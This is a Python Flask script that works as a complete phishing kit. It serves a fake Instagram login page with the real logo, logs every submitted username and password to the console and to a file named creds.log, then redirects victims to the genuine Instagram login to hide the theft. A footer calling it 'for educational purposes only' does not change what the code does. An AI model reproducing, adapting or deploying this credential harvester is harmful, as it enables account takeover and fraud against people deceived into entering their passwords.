from flask import Flask, request, render_template_string, redirect
import datetime

app = Flask(__name__)

# Instagram-Style Login Page (HTML Template)
login_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .login-container {
            background: white;
            width: 350px;
            padding: 20px;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
        .logo {
            width: 175px;
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            background: #f9f9f9;
        }
        .login-btn {
            width: 100%;
            background: #3897f0;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover {
            background: #2674c8;
        }
        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }
        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #ddd;
        }
        .separator:not(:empty)::before {
            margin-right: .25em;
        }
        .separator:not(:empty)::after {
            margin-left: .25em;
        }
        .signup-link {
            color: #00376b;
            font-weight: bold;
            text-decoration: none;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        <form action="/login" method="post">
            <input class="input-field" type="text" name="username" placeholder="Username" required><br>
            <input class="input-field" type="password" name="password" placeholder="Password" required><br>
            <button class="login-btn" type="submit">Log In</button>
        </form>
        <div class="separator">OR</div>
        <a href="#" class="signup-link">Sign up for an account</a>
    </div>
    <div class="footer">For educational purposes only.</div>
</body>
</html>
"""

# Route for home (login page)
@app.route('/')
def home():
    return render_template_string(login_page)

# Route to handle login submission
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if username and password:
        log_entry = (
            f"[{timestamp}] Captured Login Attempt\n"
            f"    Username: {username}\n"
            f"    Password: {password}\n"
            + "=" * 40 + "\n"
        )
        # Log to console
        print(log_entry)
        # Log to file
        with open("creds.log", "a") as f:
            f.write(log_entry)

        # Redirect to the official Instagram login page
        return redirect("https://www.instagram.com/accounts/login/")
    else:
        return "Invalid input."

if __name__ == '__main__':
    # Use 127.0.0.1 to avoid "getaddrinfo failed" errors
    app.run(host='127.0.0.1', port=5000, debug=True)
